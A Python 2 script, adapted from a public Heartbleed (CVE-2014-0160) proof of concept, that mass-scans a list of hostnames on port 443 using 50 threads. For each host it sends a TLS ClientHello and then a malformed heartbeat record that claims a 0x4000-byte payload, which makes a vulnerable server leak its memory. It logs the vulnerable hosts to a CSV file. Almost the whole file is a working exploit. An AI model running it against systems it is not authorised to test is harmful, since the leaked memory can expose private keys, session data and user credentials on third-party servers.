#!/usr/bin/python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.

# Modified for simplified checking by Yonathan Klijnsma
# Modified again for mass checking and multithreading by Shubham Shah

import Queue
import threading
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
import os

options = OptionParser(usage='%prog serverlist [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-o', '--output', type='str', default="//output.csv", help='Specify an output file (default: //output.csv)')



def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')

hb = h2bin(''' 
18 03 02 00 03
01 40 00
''')

def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time() 
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
        

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        return None, None, None
 
    return typ, ver, pay

def hit_hb(s, url):
    opts, args = options.parse_args()
    outputfile = open((os.getcwd() + '/' + opts.output), 'a')
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print url + ', NOT VULNERABLE'
            return False

        if typ == 24:
            if len(pay) > 3:
                print url + ', VULNERABLE'
                outputfile.write(url + ", VULNERABLE\n")
            else:
                print url + ', NOT VULNERABLE'
            return True

        if typ == 21:
            print url + ', NOT VULNERABLE'
            return False


def ssl_check(check_url):
    errorfile = open((os.getcwd() + '/errors.txt'), 'a')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sys.stdout.flush()
    try:
        s.connect((check_url, 443)) # Testing 443 as default *hardcoded*
        sys.stdout.flush()
        s.send(hello)
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                return
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        sys.stdout.flush()
        s.send(hb)
        hit_hb(s, check_url)
        s.close()
    except Exception as e:
        errorfile.write(str(e) + '\n')

def worker(queue):
    queue_full = True
    while queue_full:
        try:
            url = queue.get(False)
            ssl_check(url)
        except Queue.Empty:
            queue_full = False

def start():
    opts, args = options.parse_args()
    hostnames = open((os.getcwd() + '/' + args[0])).read().splitlines()
    q = Queue.Queue()
    for url in hostnames:
        q.put(url)
    thread_count = 50
    for i in range(thread_count):
        t = threading.Thread(target=worker, args = (q,))
        t.start()
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    start()

if __name__ == '__main__':
    main()
